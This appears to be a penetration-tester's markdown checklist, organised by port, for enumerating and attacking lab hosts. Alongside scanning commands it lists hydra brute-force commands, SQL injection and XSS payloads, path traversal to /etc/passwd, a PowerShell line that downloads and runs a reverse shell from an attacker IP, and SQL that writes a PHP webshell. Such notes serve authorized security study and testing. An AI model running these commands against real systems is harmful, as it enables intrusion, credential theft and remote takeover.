# Checklist for initial enumeration and port scanning

# Initial Enumeration

- [ ] Nmap enumeration for fastest results
```
sudo nmap -T4 -Pn -oN nmap_t4.txt -A -iL hosts.txt
```
- [ ] UDP Nmap scan
```
sudo nmap -sU -oN nmap_udp.txt -A -iL hosts.txt
```
- [ ] Autorecon
```
sudo su` `/home/kali/.local/bin/autorecon -t hosts.txt` > recon.txt
```
Hosts with a specific port open
```
nmap --open -p 111 -iL hosts.txt -oG - | grep "/open" | awk '{ print $2 }'
```
- [ ] Snmpwalk all hosts to attempt to grab currently running processes
```
snmpwalk -c public -v1 192.168.xxx.xxx 1.3.6.1.2.1.25.4.2.1.2
```

## To get more information on individual boxes

- [ ] Full nmap port scan of an ip
```
sudo nmap -p- -T4 -Pn -oN nmap_t4 -A 192.168.xxx.xxx
```

- [ ] Total snmpwalk scan
```
snmpwalk -c public -v1 -t 10 192.168.xxx.xxx > snmpwalk.txt
```

- [ ] Very long and aggressive TCP scan if stuck
```
`nmap -sC -sV -p- -vv -oA full 10.11.1.8`
```
## To get more information on a port

- [ ] Vulnerability scan of a port
```
sudo nmap -p xx -sV -A --script "vuln" 192.168.xxx.xxx
```
- [ ] No information on a port? `nc` to it or 
```
`echo "version" | nc IP PORT`
```

## Tables for organizing output

| IP              | Hostname | OS  |
| --------------- | -------- | --- |
| 10.10.xxx.xxx   | Hostname | OS  |
| 192.168.xxx.xxx | Hostname | OS  |
| 10.10.xxx.xxx   | Hostname | OS  |
| 192.168.xxx.xxx | Hostname | OS  |
| 192.168.xxx.xxx | Hostname | OS  |
| 192.168.xxx.xxx | Hostname | OS  |

| Port | Service | Notes |
| ---- | ------- | ----- |
| port | service | notes |

---
---
# Ports

## Port 21 (FTP)

- [ ] Check for default credentials
```
hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 192.168.xxx.xxx ftp
```
- [ ] Check for vulnerable FTP Version
- [ ] Brute force as root or other user if one is known
```
hydra -v -V -l root -P /usr/share/wordlists/rockyou,txt 192.168.xxx.xxx ftp
```
### If access is achieved
- [ ] Download all files
```
wget -m ftp://anonymous:anonymous@192.168.xxx.xxx

wget -r --user="USERNAME" --password="PASSWORD" ftp://192.168.xxx.xxx # if user or password has special chars
```

---
## Port 22 (SSH)

- [ ] Check for default credentials
```
hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -f 192.168.xxx.xxx -p 22 ssh
```
- [ ] Check for vulnerable SSH Version
- [ ] Brute force as root or other user if one is known
```
hydra -v -V -l root -P /usr/share/wordlists/rockyou.txt 192.168.xxx.xxx ssh
```

---
## Port 23 (Telnet)

- [ ] Try connecting to unencrypted SSH
```
telnet 192.168.xxx.xxx
```

---
## Port 25 (SMTP)

- [ ] Check for default access
```
nc -nv 192.168.xxx.xxx 25`
```

### If access is achieved
- [ ] Verify root user, or another user if one is known
```
VRFY root
```

- [ ] Enable telnet client and test
```
dism /online /Enable-Feature /FeatureName:TelnetClient;

telnet 192.168.xxx.xxx 25
```

## Port 80 (HTTP)

- [ ] Apache 2.4.49-50? Use [Path Traversal Vulnerability](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)
- [ ] Search version for vulnerabilities
- [ ] Search headers for vulnerabilities
- [ ] WFUZZ directories. Check all interesting routes and repeat if directory is found.
```
sudo wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://192.168.xxx.xxx/FUZZ
```
- [ ] WFUZZ files
```
sudo wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 http://192.168.xxx.xxx/FUZZ
```
- [ ] Attempt nmap *http-enum* script
```
sudo nmap -p80 --script=http-enum 192.168.50.20
```
- [ ] If those fail, try gobuster command from modules. WFUZZ should cover your bases but good to try incase
```
gobuster dir -u 192.168.xxx.xxx -w /usr/share/wordlists/dirb/common.txt -t 5
```
- [ ] Check if the website uses WordPress and can be scanned with WPScan
```
wpscan --url http://192.168.xxx.xxx --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

### After connecting to the website from firefox

- [ ] Look over every page
- [ ] Take note of people's names for usernames
- [ ] Take note of any forms and ways to send a post request to the server
- [ ] Try SQL Injection on **EVERY** form ([cheatsheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/))
```
admin' or '1'='1' -- //
```
- [ ] Try XSS on **EVERY** form ([cheatsheet](https://gist.github.com/sseffa/11031135))
```
<script>alert(42)</script>
```
- [ ] Try encoded XSS Injection on **EVERY** form ([cheatsheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/))
```
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```
- [ ] Attempt basic path traversal
```
curl http://192.168.xxx.xxx/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### If page ends with `.php`
- [ ] Try something like this to get commands to execute
```
curl "http://192.168.xxx.xxx/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
- [ ] PHP Webshell
```
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls
```

#### If command injection is possible on windows
- [ ] Check if the server is being run on windows or powershell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`
```
- [ ] If powershell, create payload
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.218/reverse_shell.exe");.\reverse_shell.exe
```
- [ ] URL encode with [cyberchef](https://gchq.github.io/CyberChef/) and include as command

#### If SQL injection is possible
- [ ] Check this query to see if anything is being printed
```sql
SELECT @@version;
```
- [ ] Run this and change 1 to discover number of columns
```sql
ORDER BY 1-- //
```
- [ ] Attempt Union based payload
```sql
%' UNION SELECT database(), user(), @@version, null, null -- //
```
- [ ] Test for time-based SQLi payload
```
http://192.168.xxx.xxx/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
- [ ] Test for boolean-based SQLi payload
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

#### Windows based code execution SQL injection
- [ ] Attempt these commands in the SQLi sequentially
```powershell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
- [ ] Save it as `webshell.php` in a writeable web folder, then navigate to `http://192.168.xxx.xxx/tmp/webshell.php?cmd=id`
```sql
UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

---
## Port 88 (Kerberos) (Domain Controller)

- [ ] Try brute forcing, but this would take a while and needs a shorter `userlist` in `userdb`
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=<Domain>,userdb=/usr/share/wordlists/seclists/usernames/names/names.txt 10.10.xxx.xxx
```

---
## Port 135 (Microsoft RPC)

- [ ] Connect with no credentials, or credentials if you have them
```
rpcclient -U '' 192.168.xxx.xxx
```

#### Once authenticated
- [ ] Use rpcclient to enum domain users
```
enumdomusers
```
- [ ] Use rpcclient to dump AD info
```
querydispinfo
```
- [ ] Use rpcclient to enumerate members of a contractor
```
enumdomgroups /querygroupmen
```
---

## Port 139/Port 445 (SMB)
- [ ] Use NMAP script to enumerate
```
nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 192.168.xxx.xxx
```
- [ ] Try the following configurations to connect
```
smbclient -U '' -L \\\\192.168.xxx.xxx
smbclient -U '' -N -L \\\\192.168.xxx.xxx
smbclient -U '%' -N -L \\\\192.168.xxx.xxx
smbclient -U '%' -N \\\\192.168.xxx.xxx\\<Folder>
```
- [ ] Random username with no password and try for anonymous login
```
crackmapexec smb <IP> -u 'anonymous' -p ''
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
```
---
## Port 161, Port 162 (SNMP)
- [ ] Snmpwalk all hosts to attempt to grab currently running processes
```
snmpwalk -c public -v1 192.168.xxx.xxx 1.3.6.1.2.1.25.4.2.1.2
```
- [ ] Total snmpwalk scan
```
snmpwalk -c public -v1 -t 10 192.168.xxx.xxx > snmpwalk.txt
```
---

# Port 389 (LDAP)
- [ ] See what can be pulled with nmap
```
nmap -n -sV --script "ldap* and not brute" 192.168.xxx.xxx 
```
- [ ] ldapdomaindump without creds
```
ldapdomaindump -u security.local\\<User> -p '<Password>' ldap://192.168.xxx.xxx 
```
- [ ] ldapdomaindump without creds specific user
```
ldapsearch -x -H ldap://192.168.xxx.xxx -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
```
### If we have creds for a user
- [ ] ldapdomaindump with creds
```
ldapdomaindump -u security.local\\<User> -p '<Password>' ldap://192.168.xxx.xxx 
```
- [ ] ldapsearch with creds
```
ldapsearch -x -H ldap://192.168.xxx.xxx -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
```
---
## Port 1433 (Default MSSQL port)

- [ ] Attempt default login
```
sqsh -S 192.168.xxx.xxx -U sa
```
---
## Port 1521 (Oracle DB)

- [ ] Get information
```
tnscmd10g version -h 1192.168.xxx.xxx
```
---
## Port 2021 (Network File System)
- [ ] showmount
```
showmount -e 192.168.xxx.xxx 
```
---
## Port 3306 (MySQL)
- [ ] Remote access as root (always check root:root)
```
mysql --host=192.168.xxx.xxx --port=3306 --user=wp -p
```

### Local access

- [ ] Local access as root (always check root:root)
```
mysql -u root -p
```
- [ ] Local access as root no password
```
mysql -u root 
```
## Port 3389 (RDP)

- [ ] If possible users are known, attempt to attack RDP
```
hydra -L names.txt -P /usr/share/wordlists/rockyou/txt rdp://192.168.xxx.xxx
```
